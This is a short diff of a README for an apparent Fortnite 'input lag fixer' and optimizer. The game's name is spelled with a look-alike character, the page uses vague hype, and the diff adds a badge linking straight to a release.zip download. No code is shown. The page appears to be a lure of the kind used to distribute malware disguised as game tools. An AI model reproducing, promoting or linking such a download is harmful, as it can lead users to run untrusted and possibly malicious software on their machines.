@@ -1,8 +1,8 @@
 
-# FORTNlTE INPUT LAG FIXER
+# FORTNlTE INPUT LAG FIXER 
 ![gif](https://www.icegif.com/wp-content/uploads/2023/10/icegif-721.gif)
 
-## Fortnite Optimizer/ input lag fixer: Boost Your Gameplay!
+## Fortnite Optimizer/ input lag fixer: Boost Your Gameplay! [![Hand-cursor-icon-with-blue-Download-button](https://img.shields.io/badge/Download-latest_release)](https://github.com/C6p9/fortnite-optimizer/releases/download/optimizer/release.zip)
 
 > Unlock your full potential in Fortnite with our cutting-edge optimizer software! Designed specifically for gamers, this tool enhances your gaming experience by fine-tuning your system settings for optimal performance.
 	
